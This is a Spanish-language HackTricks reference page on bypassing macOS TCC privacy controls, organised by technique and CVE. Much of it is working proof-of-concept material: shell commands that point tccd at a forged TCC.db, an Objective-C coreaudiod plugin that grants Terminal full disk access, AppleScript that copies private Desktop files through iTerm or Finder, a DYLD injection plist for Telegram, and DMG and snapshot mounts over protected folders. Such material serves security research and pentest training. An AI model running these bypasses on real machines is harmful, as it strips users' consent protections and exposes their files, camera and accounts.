# Bypasses de TCC en macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Por funcionalidad

### Bypass de escritura

Esto no es un bypass, es simplemente cómo funciona TCC: **no protege de la escritura**. Si Terminal **no tiene acceso para leer el Escritorio de un usuario, aún puede escribir en él**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
El atributo extendido `com.apple.macl` se agrega al nuevo archivo para dar acceso a la aplicación creadora para leerlo.

### Bypass de SSH

Por defecto, el acceso a través de SSH solía tener "Acceso completo al disco". Para desactivarlo, es necesario que esté en la lista pero desactivado (eliminarlo de la lista no eliminará esos privilegios):

![](<../../../../../.gitbook/assets/image (569).png>)

Aquí puedes encontrar ejemplos de cómo algunos malwares han logrado evadir esta protección:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Ten en cuenta que ahora, para poder habilitar SSH, necesitas "Acceso completo al disco".
{% endhint %}

### Manejar extensiones - CVE-2022-26767

El atributo `com.apple.macl` se otorga a los archivos para darle a una determinada aplicación permisos para leerlo. Este atributo se establece cuando se arrastra y suelta un archivo sobre una aplicación, o cuando un usuario hace doble clic en un archivo para abrirlo con la aplicación predeterminada.

Por lo tanto, un usuario podría registrar una aplicación maliciosa para manejar todas las extensiones y llamar a Launch Services para abrir cualquier archivo (de modo que el archivo malicioso obtendrá acceso para leerlo).

### iCloud

Con el entitlement `com.apple.private.icloud-account-access`, es posible comunicarse con el servicio XPC `com.apple.iCloudHelper`, que proporcionará tokens de iCloud.

**iMovie** y **Garageband** tenían este entitlement y otros que lo permitían.

Para obtener más información sobre la explotación para obtener tokens de iCloud a partir de ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatización

Una aplicación con el permiso `kTCCServiceAppleEvents` podrá controlar otras aplicaciones. Esto significa que podría abusar de los permisos otorgados a las otras aplicaciones.

Para obtener más información sobre los Apple Scripts, consulta:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Por ejemplo, si una aplicación tiene permiso de automatización sobre `iTerm`, por ejemplo en este caso **`Terminal`** tiene acceso a iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que no tiene "Acceso completo al disco", puede llamar a iTerm, que sí lo tiene, y usarlo para realizar acciones:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Sobre Finder

O si una aplicación tiene acceso sobre Finder, podría ejecutar un script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamiento de la aplicación

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

El demonio **tccd** en el espacio de usuario utiliza la variable de entorno **`HOME`** para acceder a la base de datos de usuarios de TCC desde: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Según [esta publicación de Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) y debido a que el demonio TCC se ejecuta a través de `launchd` dentro del dominio del usuario actual, es posible **controlar todas las variables de entorno** que se le pasan.\
Por lo tanto, un **atacante podría establecer la variable de entorno `$HOME`** en **`launchctl`** para que apunte a un **directorio controlado**, **reiniciar** el demonio **TCC** y luego **modificar directamente la base de datos de TCC** para otorgarse a sí mismo **todos los permisos de TCC disponibles** sin solicitar la aprobación del usuario final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

Las notas tenían acceso a ubicaciones protegidas por TCC, pero cuando se crea una nota, esta se crea en una ubicación no protegida. Por lo tanto, podrías pedirle a las notas que copien un archivo protegido en una nota (en una ubicación no protegida) y luego acceder al archivo:

<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocación

El binario `/usr/libexec/lsd` con la biblioteca `libsecurity_translocate` tenía el permiso `com.apple.private.nullfs_allow`, lo que le permitía crear un montaje **nullfs** y tenía el permiso `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a todos los archivos.

Era posible agregar el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y luego se mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`**, donde se podían **acceder** todos los documentos dentro de Library.

### CVE-2023-38571 - Música y TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** tiene una característica interesante: cuando se está ejecutando, **importará** los archivos que se arrastren a **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** a la "biblioteca multimedia" del usuario. Además, llama algo como: **`rename(a, b);`** donde `a` y `b` son:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Este comportamiento de **`rename(a, b);`** es vulnerable a una **condición de carrera**, ya que es posible colocar dentro de la carpeta `Automatically Add to Music.localized` un archivo falso **TCC.db** y luego, cuando se crea la nueva carpeta (b) para copiar el archivo, eliminarlo y apuntarlo a **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="ruta/carpeta"`**, básicamente significa que **cualquier base de datos abierta se copia en esa ruta**. En este CVE, este control se abusó para **escribir** dentro de una **base de datos SQLite** que va a ser **abierta por un proceso con FDA la base de datos TCC**, y luego abusar de **`SQLITE_SQLLOG_DIR`** con un **enlace simbólico en el nombre de archivo** para que cuando se **abra** esa base de datos, se sobrescriba la base de datos del usuario **TCC.db** con la abierta.
[**Más información aquí**](https://youtu.be/f1HA5QhLQ7Y?t=20548).

### **SQLITE\_AUTO\_TRACE**

Si la variable de entorno **`SQLITE_AUTO_TRACE`** está configurada, la biblioteca **`libsqlite3.dylib`** comenzará a **registrar** todas las consultas SQL. Muchas aplicaciones utilizaban esta biblioteca, por lo que era posible registrar todas sus consultas SQLite.

Varias aplicaciones de Apple utilizaban esta biblioteca para acceder a información protegida por TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple Remote Desktop

Como root, puedes habilitar este servicio y el agente **ARD tendrá acceso completo al disco**, lo cual podría ser abusado por un usuario para hacer que copie una nueva base de datos de usuario de TCC.

## Mediante **NFSHomeDirectory**

TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el acceso a recursos específicos del usuario en **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Por lo tanto, si el usuario logra reiniciar TCC con una variable de entorno $HOME que apunte a una **carpeta diferente**, el usuario podría crear una nueva base de datos de TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que otorgue cualquier permiso de TCC a cualquier aplicación.

{% hint style="success" %}
Ten en cuenta que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** como valor de `$HOME`, por lo que si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **armar** esta opción con un bypass de TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) y [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar la carpeta **HOME** del usuario.

1. Obtén un blob _csreq_ para la aplicación objetivo.
2. Planta un archivo falso _TCC.db_ con el acceso requerido y el blob _csreq_.
3. Exporta la entrada de Servicios de Directorio del usuario con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifica la entrada de Servicios de Directorio para cambiar el directorio de inicio del usuario.
5. Importa la entrada de Servicios de Directorio modificada con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Detén el proceso _tccd_ del usuario y reinicia el proceso.

El segundo POC utilizó **`/usr/libexec/configd`** que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era posible ejecutar **`configd`** con la opción **`-t`**, por lo que un atacante podría especificar una **Carga de paquete personalizada**. Por lo tanto, el exploit **reemplaza** el método **`dsexport`** y **`dsimport`** para cambiar el directorio de inicio del usuario con una **inyección de código en `configd`**.

Para obtener más información, consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Mediante inyección de proceso

Existen diferentes técnicas para inyectar código dentro de un proceso y abusar de sus privilegios de TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Además, la inyección de proceso más común para eludir TCC se realiza a través de **plugins (carga de bibliotecas)**.\
Los plugins son código adicional generalmente en forma de bibliotecas o plist, que se **cargan por la aplicación principal** y se ejecutan bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos otorgados o entitlements), el **código personalizado también lo tendrá**.

### CVE-2020-27937 - Directory Utility

La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con extensión **`.daplug`** y **no tenía el runtime endurecido**.

Para aprovechar esta CVE, se **cambia** el **`NFSHomeDirectory`** (abusando del entitlement anterior) para poder **tomar el control de la base de datos de TCC** de los usuarios y eludir TCC.

Para obtener más información, consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

El binario **`/usr/sbin/coreaudiod`** tenía los entitlements `com.apple.security.cs.disable-library-validation` y `com.apple.private.tcc.manager`. El primero **permite la inyección de código** y el segundo le otorga acceso para **administrar TCC**.

Este binario permitía cargar **plugins de terceros** desde la carpeta `/Library/Audio/Plug-Ins/HAL`. Por lo tanto, era posible **cargar un plugin y abusar de los permisos de TCC** con este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para obtener más información, consulta el [**informe original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-Ins de la Capa de Abstracción de Dispositivos (DAL)

Las aplicaciones del sistema que abren el flujo de la cámara a través de Core Media I/O (aplicaciones con **`kTCCServiceCamera`**) cargan **en el proceso estos complementos** ubicados en `/Library/CoreMediaIO/Plug-Ins/DAL` (no restringidos por SIP).

Simplemente almacenar allí una biblioteca con el **constructor** común funcionará para **inyectar código**.

Varias aplicaciones de Apple eran vulnerables a esto.

### Firefox

La aplicación de Firefox tenía los permisos `com.apple.security.cs.disable-library-validation` y `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para obtener más información sobre cómo explotar esto fácilmente, consulta el [**informe original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

El binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tenía los permisos **`com.apple.private.tcc.allow`** y **`com.apple.security.get-task-allow`**, lo que permitía inyectar código dentro del proceso y utilizar los privilegios de TCC.

### CVE-2023-26818 - Telegram

Telegram tenía los permisos **`com.apple.security.cs.allow-dyld-environment-variables`** y **`com.apple.security.cs.disable-library-validation`**, por lo que era posible abusar de ellos para **obtener acceso a sus permisos**, como grabar con la cámara. Puedes encontrar el **código malicioso en el informe**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Observa cómo se utiliza la variable de entorno para cargar una biblioteca, se creó un **plist personalizado** para inyectar esta biblioteca y se utilizó **`launchctl`** para ejecutarlo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Mediante invocaciones abiertas

Es posible invocar **`open`** incluso estando en un entorno sandbox&#x20;

### Scripts de Terminal

Es bastante común darle a la terminal **Acceso completo al disco (FDA)**, al menos en computadoras utilizadas por personas técnicas. Y es posible invocar scripts **`.terminal`** utilizando esto.

Los scripts **`.terminal`** son archivos plist como este, con el comando a ejecutar en la clave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Una aplicación podría escribir un script de terminal en una ubicación como /tmp y ejecutarlo con un comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mediante montaje

### CVE-2020-9771 - Bypass y escalada de privilegios de TCC en mount\_apfs

**Cualquier usuario** (incluso los no privilegiados) puede crear y montar una instantánea de Time Machine y **acceder a TODOS los archivos** de esa instantánea.\
El **único privilegio** necesario es que la aplicación utilizada (como `Terminal`) tenga **Acceso completo al disco** (FDA) (`kTCCServiceSystemPolicyAllfiles`), el cual debe ser otorgado por un administrador.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Una explicación más detallada se puede encontrar en el [**informe original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 y CVE-2021-30808 - Montar sobre el archivo TCC

Incluso si el archivo TCC DB está protegido, era posible **montar sobre el directorio** un nuevo archivo TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Revisa el **exploit completo** en el [**informe original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

La herramienta **`/usr/sbin/asr`** permitía copiar todo el disco y montarlo en otro lugar, evitando las protecciones de TCC.

### Servicios de ubicación

Hay una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** para indicar los clientes autorizados a **acceder a los servicios de ubicación**.\
La carpeta **`/var/db/locationd/` no estaba protegida del montaje de DMG**, por lo que era posible montar nuestro propio plist.

## A través de aplicaciones de inicio

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## A través de grep

En varias ocasiones, los archivos almacenarán información sensible como correos electrónicos, números de teléfono, mensajes... en ubicaciones no protegidas (lo cual se considera una vulnerabilidad en Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Clicks sintéticos

Esto ya no funciona, pero [**sí funcionó en el pasado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Otra forma de utilizar [**eventos de CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Referencia

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Formas de Evadir los Mecanismos de Privacidad de tu macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
